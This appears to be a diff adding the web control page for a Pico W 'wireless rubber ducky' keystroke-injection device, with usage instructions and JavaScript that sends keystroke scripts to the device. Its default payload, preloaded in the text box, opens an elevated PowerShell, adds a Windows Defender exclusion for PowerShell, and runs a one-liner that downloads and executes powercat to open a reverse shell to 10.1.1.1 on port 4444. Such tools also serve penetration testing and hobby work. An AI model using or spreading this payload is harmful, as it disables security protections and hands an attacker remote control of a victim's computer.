@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>pico w</title>
+</head>
+<body>
+	<h1>wireless rubber ducky!!</h1>
+	<div class="x-center">
+		<div class="normal-div">
+			<h3>send keystrokes:</h3>
+			<textarea type="text" id="keys-to-send" class="monospace"></textarea>
+		</div>
+		<div class="normal-div">
+			<h1>usage:</h1>
+			<ul>
+				<li>Type normal text by just putting the text on a line, use special keys for newlines</li>
+					<ul>
+						Example: <span class="monospace">hello world</span> types "hello world"
+					</ul>
+				<li>For special keys (SHIFT, COMMAND, etc) use the format <span class="monospace">> KEY UP/DOWN</span>. Make sure there are spaces between >, KEY, and UP/DOWN</li>
+					<ul>
+						Example: <span class="monospace">> TAB DOWN</span> presses the TAB key down.
+					</ul>
+					<ul>
+						Use <span class="monospace">> TAB UP</span> to release it
+					</ul>
+					<ul>
+						<a href="https://docs.circuitpython.org/projects/hid/en/latest/_modules/adafruit_hid/keycode.html" target="_blank">Here</a> is a full list of special keys.
+					</ul>
+				<li>There is a special SLEEP command that can be used to add delays, in milliseconds, in the format <span class="monospace">> SLEEP time-in-ms</span></li>
+					<ul>
+						Example: <span class="monospace">> SLEEP 1000</span> waits for 1000ms, or 1 second
+					</ul>
+				<li>To use the mouse, such as clicking, dragging and moving, use MOUSE commands:</li>
+				<li>To MOVE the mouse:</li>
+					<ul>
+						<span class="monospace">> MOUSE MOVE x y</span> moves the mouse <span class="monospace">x</span> right and <span class="monospace">y</span> down.
+					</ul>
+					<ul>
+						Example: <span class="monospace">> MOUSE MOVE 1000 -500</span> moves the mouse right 1000, and up 500
+					</ul>
+				<li>To CLICK the mouse:</li>
+					<ul>
+						<span class="monospace">> MOUSE CLICK mouse_button</span>
+					</ul>
+					<ul>
+						Example: <span class="monospace">> MOUSE CLICK 1</span> performs a left click.
+					</ul>
+				<li>To HOLD down a mouse button:</li>
+					<ul>
+						<span class="monospace">> MOUSE UP/DOWN mouse_button</span>
+					</ul>
+					<ul>
+						Example: <span class="monospace">> MOUSE DOWN 1</span> holds down left click.
+					</ul>
+					<ul>
+						Example: <span class="monospace">> MOUSE UP 1</span> releases left click.
+					</ul>
+				<li>
+					<span class="monospace">1</span> is left mouse button
+				</li>
+				<li>
+					<span class="monospace">2</span> is right mouse button
+				</li>
+				<li>
+					<span class="monospace">4</span> is middle mouse button
+				</li>
+			</ul>
+		</div>
+	</div>
+	<button onclick="submit()">submit</button>
+	<button onclick="terminate()">terminate server</button>
+	<p>check the <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a> for usage info</p>
+	<div style="position: absolute; bottom: 0; left: 10px;">
+		<p style="font-size: 10px;">by TheSavageTeddy on <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a></p>
+	</div>
+</body>
+
+<style>
+.x-center {
+	display: flex;
+	align-items: center;
+	justify-content: flex-start;
+}
+
+.normal-div{
+	align-items: normal;
+}
+
+.monospace{
+	font-family: 'Courier New', Courier, monospace;
+}
+
+#keys-to-send {
+	width: 50vw;
+	height: 60vh;
+}
+
+</style>
+<script>
+function ascii_to_hex(str) {
+	var arr1 = [];
+	for(var n = 0, l = str.length; n < l; n++) {
+		var hex = Number(str.charCodeAt(n)).toString(16);
+		arr1.push(hex);
+	}
+	return arr1.join('');
+}
+
+function setStatus(text) {
+	document.getElementById("status").innerHTML = text
+}
+
+function terminate() {
+	confirm("Are you sure you want to terminate the server?") ? 
+	fetch('/terminate', {
+		method: 'POST',
+		headers: {
+			'Accept': '*/*',
+		},
+	}) : null
+}
+
+function submit() {
+	
+	let input = document.getElementById("keys-to-send").value
+	let to_send = []
+	input = input.split("\n")
+	input.forEach(e => {
+		if(e[0] === ">") {
+			tmp = e.split(" ")
+			tmp.shift()
+			to_send.push(tmp)
+		} else {
+			to_send.push(e)
+		}
+	});
+	let data = ascii_to_hex(JSON.stringify({
+		"keys": to_send
+	}))
+	fetch(`/sendkeys?keys=${data}`, {
+		method: 'GET'
+	})
+}
+document.addEventListener("DOMContentLoaded", () => {
+	
+	let savedPayload = localStorage.getItem('payload')
+	if (savedPayload !== null) {
+		// use localstorage saved payload
+		document.getElementById("keys-to-send").innerHTML = savedPayload
+	} else {
+		// Default text
+		document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
+> R DOWN
+> R UP
+> GUI UP
+> SLEEP 200
+powershell
+> SLEEP 200
+> ENTER DOWN
+> ENTER UP
+> SLEEP 200
+powershell -c "Start-Process powershell -Verb runAs"
+> SLEEP 500
+> ENTER DOWN
+> ENTER UP
+> SLEEP 500
+Set-MpPreference -ExclusionProcess "powershell.exe"
+> ENTER DOWN
+> ENTER UP
+> SLEEP 200
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.1.1.1 -p 4444 -e cmd
+> ENTER DOWN
+> ENTER UP
+`
+	}
+
+})
+
+document.getElementById("keys-to-send").addEventListener("input", ()=>{
+	// save your payload to local storage to presist after reload
+	localStorage.setItem('payload', document.getElementById("keys-to-send").value);
+})
+
+</script>
+
+</html>
